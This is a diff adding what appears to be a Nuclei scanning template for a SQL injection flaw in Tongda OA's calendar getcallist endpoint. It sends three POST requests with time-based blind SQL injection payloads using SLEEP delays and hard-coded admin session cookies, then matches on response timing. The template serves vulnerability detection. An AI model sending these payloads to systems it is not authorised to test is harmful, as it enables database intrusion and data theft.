@@ -1,0 +1,57 @@
+id: tongda-getcallist-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。通达OA getcallist存在前台SQL注入漏洞,攻击者通过漏洞可以获取数据库信息。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/T10-1%E9%80%9A%E8%BE%BE-OA-SQL?id=t10-1%e9%80%9a%e8%be%be-oa-sql
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=f4f833d3; UI_COOKIE=0; PHPSESSID=u1hk9v9ar46ejfd46uk7vupu23; KEY_RANDOMDATA=18528
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Length: 119
+
+        starttime=1' AND (SELECT 7846 FROM (SELECT(SLEEP(3)))SfMD) AND 'GpBS'='GpBS&endtime=1598918400&view=month&condition=1
+      - |
+        POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=f4f833d3; UI_COOKIE=0; PHPSESSID=u1hk9v9ar46ejfd46uk7vupu23; KEY_RANDOMDATA=18528
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Length: 119
+
+        starttime=1' AND (SELECT 7846 FROM (SELECT(SLEEP(6)))SfMD) AND 'GpBS'='GpBS&endtime=1598918400&view=month&condition=1
+      - |
+        POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=f4f833d3; UI_COOKIE=0; PHPSESSID=u1hk9v9ar46ejfd46uk7vupu23; KEY_RANDOMDATA=18528
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Length: 119
+
+        starttime=1' AND (SELECT 7846 FROM (SELECT(SLEEP(9)))SfMD) AND 'GpBS'='GpBS&endtime=1598918400&view=month&condition=1
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
